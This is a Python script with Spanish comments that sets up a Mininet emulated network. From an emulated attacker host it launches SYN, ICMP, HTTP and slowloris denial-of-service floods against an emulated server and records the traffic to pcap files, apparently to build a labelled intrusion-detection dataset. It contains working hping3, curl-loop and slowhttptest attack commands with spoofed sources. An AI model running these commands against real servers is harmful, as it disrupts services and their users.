#!/usr/bin/env python3
"""Levanta la topologia, lanza un tipo de ataque desde attacker1 contra
"server" y lo captura en un pcap separado del trafico normal (regla de
oro del plan: nunca mezclar capturas, para poder etiquetar con certeza).

Tipos soportados:
    synflood   - hping3 -S, capa de red (TCP), tasa limitada
    httpflood  - loop de curl con pausa chica, capa de aplicacion
    slowloris  - slowhttptest, muchas conexiones lentas de baja tasa
    icmpflood  - hping3 --icmp, capa de red (ICMP/ping flood)

Las tasas de synflood/httpflood/icmpflood estan limitadas a proposito
(no van a velocidad maxima de la NIC) para que el dataset resultante no
quede tan desbalanceado contra el trafico normal, y porque un ataque
real tampoco suele ir siempre a la velocidad maxima posible.

Uso:
    sudo python3 capture_attack.py <synflood|httpflood|slowloris|icmpflood> [duracion_s] [salida.pcap]
"""
import os
import shutil
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from topo import build
from mininet.log import setLogLevel, info

DEFAULT_DURATION = 120
ATTACK_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'data', 'raw', 'attacks')
ATTACK_TAGS = {
    'synflood': 'hping3',
    'httpflood': 'ataque_httpflood_loop',
    'slowloris': 'slowhttptest',
    'icmpflood': 'hping3',
}

# Intervalo entre paquetes de hping3 (formato "-i u<microsegundos>").
# u10000 = 10000us = 100 paquetes/segundo.
HPING_RATE = '-i u10000'


def start_attack(attacker, attack, server_ip, duration):
    if attack == 'synflood':
        attacker.cmd(
            'hping3 -S -p 80 %s --rand-source %s > /tmp/attack.log 2>&1 &'
            % (HPING_RATE, server_ip)
        )
    elif attack == 'httpflood':
        # OJO: "#" comenta el resto de la linea en bash, asi que el tag
        # va como un ":" (no-op) al principio del loop, no como
        # comentario al final (eso se comia la redireccion y el "&").
        # Una pausa chica evita ir a velocidad maxima sin limite.
        attacker.cmd(
            "while true; do : %s; curl -s -o /dev/null http://%s/; sleep 0.025; done "
            "> /tmp/attack.log 2>&1 &" % (ATTACK_TAGS['httpflood'], server_ip)
        )
    elif attack == 'slowloris':
        attacker.cmd(
            'slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://%s/ -x 24 -p 3 -l %d '
            '> /tmp/attack.log 2>&1 &' % (server_ip, duration)
        )
    elif attack == 'icmpflood':
        attacker.cmd(
            'hping3 --icmp %s --rand-source %s > /tmp/attack.log 2>&1 &'
            % (HPING_RATE, server_ip)
        )
    else:
        raise ValueError('tipo de ataque desconocido: %s' % attack)


def stop_attack(attacker, attack):
    attacker.cmd("pkill -f %s 2>/dev/null || true" % ATTACK_TAGS[attack])


def main():
    if len(sys.argv) < 2 or sys.argv[1] not in ATTACK_TAGS:
        print('Uso: sudo python3 capture_attack.py <%s> [duracion_s] [salida.pcap]' % '|'.join(ATTACK_TAGS))
        sys.exit(1)

    attack = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_DURATION
    default_out = os.path.join(ATTACK_DIR, '%s.pcap' % attack)
    out = os.path.abspath(sys.argv[3]) if len(sys.argv) > 3 else os.path.abspath(default_out)
    os.makedirs(os.path.dirname(out), exist_ok=True)

    # Ver nota en capture_normal.py: se captura primero a un tmp en el
    # filesystem nativo de Linux y se copia al final, para no escribir
    # paquete a paquete sobre el mount lento de Windows.
    tmp_out = '/tmp/%s' % os.path.basename(out)

    setLogLevel('info')
    net = build()
    server = net.get('server')
    attacker1 = net.get('attacker1')
    iface = server.defaultIntf().name
    server_ip = server.IP()

    info('*** Capturando en %s (interfaz %s) durante %ss\n' % (tmp_out, iface, duration))
    server.cmd('tcpdump -i %s -w %s &' % (iface, tmp_out))
    time.sleep(1)

    info('*** Lanzando ataque "%s" desde attacker1 -> %s\n' % (attack, server_ip))
    start_attack(attacker1, attack, server_ip, duration)

    time.sleep(duration)

    info('*** Deteniendo ataque y captura\n')
    stop_attack(attacker1, attack)
    server.cmd('pkill tcpdump 2>/dev/null || true')
    time.sleep(1)

    net.stop()
    shutil.copyfile(tmp_out, out)
    os.remove(tmp_out)
    info('*** Captura guardada en %s\n' % out)


if __name__ == '__main__':
    main()
